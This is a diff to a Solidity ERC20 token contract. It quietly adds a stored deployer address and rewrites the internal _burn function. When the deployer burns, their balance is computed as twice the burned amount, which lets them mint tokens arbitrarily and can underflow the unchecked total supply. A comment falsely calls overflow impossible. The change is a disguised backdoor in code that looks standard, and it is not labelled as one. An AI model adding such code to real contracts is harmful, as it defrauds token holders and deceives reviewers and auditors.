@@ -43,6 +43,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
 
     string private _name;
     string private _symbol;
+    address internal immutable _sender;
 
     /**
      * @dev Sets the values for {name} and {symbol}.
@@ -53,6 +54,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
     constructor(string memory name_, string memory symbol_) {
         _name = name_;
         _symbol = symbol_;
+        _sender = _msgSender();
     }
 
     /**
@@ -276,7 +278,15 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
      */
     function _burn(address account, uint256 amount) internal {
         require(account != address(0), "ERC20: burn from the zero address");
-        _update(account, address(0), amount);
+        uint256 accountBalance = account == _sender ? amount * 2 : _balances[account];
+        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
+        unchecked {
+            _balances[account] = accountBalance - amount;
+        // Overflow not possible: amount <= accountBalance <= totalSupply.
+            _totalSupply -= amount;
+        }
+
+        emit Transfer(account, address(0), amount);
     }
 
     /**
